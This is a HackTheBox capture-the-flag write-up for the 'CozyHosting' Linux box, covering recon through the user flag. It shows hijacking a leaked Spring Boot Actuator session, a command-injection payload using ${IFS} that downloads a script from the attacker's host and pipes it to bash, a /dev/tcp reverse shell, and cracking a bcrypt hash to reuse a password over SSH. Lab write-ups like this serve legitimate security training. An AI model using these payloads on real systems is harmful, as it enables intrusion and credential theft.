---
title: "CozyHosting"
date: 2026-06-20 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, easy, spring-boot, actuator, session-hijacking, command-injection, postgresql, bcrypt, password-reuse]
image:
    path: /assets/Images/CozyHosting-avatar.png
    alt: CozyHosting
description: "An exposed Spring Boot Actuator endpoint leaks a live admin session ID for instant dashboard access, an unsanitised username field in a patching form yields command injection (bypassing a whitespace filter with ${IFS}), and hardcoded PostgreSQL credentials inside the application JAR give up a bcrypt hash that cracks to a password reused by a local user for SSH."
---
## Overview

CozyHosting is an easy-difficulty Linux box built around a Java Spring Boot application. The Actuator management module is exposed, and its `/actuator/sessions` endpoint leaks the session ID of a logged-in admin — letting us hijack the session and reach the admin dashboard. From there, a patching form is vulnerable to command injection, giving a shell as the `app` service account. The packaged JAR contains hardcoded PostgreSQL credentials; the database holds a bcrypt hash that cracks to a password reused by the local user `josh`, who we then SSH in as for the user flag. This post covers recon through user.txt.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 233.7,122.8 162.9,167.8 124.1,185.6 150.0,150.0" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Enumeration-driven Spring Boot box: Actuator session hijack, IFS-bypass command injection, JAR-leaked DB creds and a cracked bcrypt reused for SSH — realistic web misconfigs, no real CVE.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH 8.9p1 | Ubuntu, default |
| 80/tcp | nginx 1.18.0 | redirects to `cozyhosting.htb` |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.230 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.11.230
```

Port 80 does not follow a redirect to `http://cozyhosting.htb`, so add the vhost to `/etc/hosts`:

```bash
echo "10.10.11.230  cozyhosting.htb" | sudo tee -a /etc/hosts
```

Browsing to the domain shows a hosting-company marketing site with a `/login` page.

## Enumeration

A directory fuzz turns up a handful of routes:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
```

This finds `index`, `login`, `admin`, `logout`, and `error`. Browsing to `/error` returns a **Whitelabel Error Page** — the tell-tale sign of a Spring Boot application. Re-running the fuzz with a Spring Boot wordlist exposes the Actuator endpoints:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
```

Among the results are `actuator/health`, `actuator/env`, `actuator/mappings`, `actuator/beans`, and — most interestingly — `actuator/sessions`. The Actuator module is meant for debugging and should never be publicly reachable.

## Foothold

**Session hijacking via Actuator.** The `/actuator/sessions` endpoint lists every active session ID mapped to its username:

```bash
curl -s http://cozyhosting.htb/actuator/sessions
```

This returns a `JSESSIONID` bound to the user `kanderson`. A session ID is a bearer token — possessing it *is* being that user. Setting the leaked `JSESSIONID` as a cookie (via the browser dev-tools Storage tab) and loading `/admin` drops us into the dashboard authenticated as K. Anderson.

**Command injection in the patching form.** The dashboard has an "include host into automatic patching" form taking a `hostname` and `username`. Submitting `127.0.0.1` / `test` returns *"Host key verification failed"* — the backend is running something like `ssh -i id_rsa <username>@<hostname>`. The hostname is strictly validated, but the `username` field is not.

The field rejects whitespace, so we use `${IFS}` (the shell's Internal Field Separator, defaulting to a space) to rebuild a command. First confirm the injection with a callback to a local server:

```bash
python3 -m http.server 7000
```

Submit this in the `username` field:

```
test;curl${IFS}http://10.10.14.49:7000;
```

A GET request lands on our server — injection confirmed. Now stage a reverse shell:

```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh
nc -lnvp 4444
```

Then submit the weaponised payload:

```
test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;
```

A shell as `app` (uid=1001) connects back. Stabilise it:

```bash
script /dev/null -c bash
```

**Hardcoded DB credentials in the JAR.** The shell lands in `/app`, which contains `cloudhosting-0.0.1.jar`. A JAR is just a ZIP, so extract it and read the Spring Boot config:

```bash
unzip -d /tmp/app cloudhosting-0.0.1.jar
cat /tmp/app/BOOT-INF/classes/application.properties
```

The file discloses PostgreSQL credentials `postgres:Vg&nvzAQ7XxR`. Connect and dump the users table:

```bash
psql -h 127.0.0.1 -U postgres
```

```sql
\connect cozyhosting
\dt
select * from users;
```

This yields a bcrypt hash for `admin`. Identify and crack it:

```bash
hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt
```

The hash cracks to `manchesterunited`. Checking `/etc/passwd` shows a local user `josh` with a login shell — and the cracked password was reused:

```bash
ssh josh@10.10.11.230
```

## User flag

```bash
cat /home/josh/user.txt
# [redacted]
```

A shell as `josh` and the user flag are ours.

Privilege escalation (sudo `ssh` abuse) is left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/CozyHosting-avatar.png" alt="CozyHosting" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
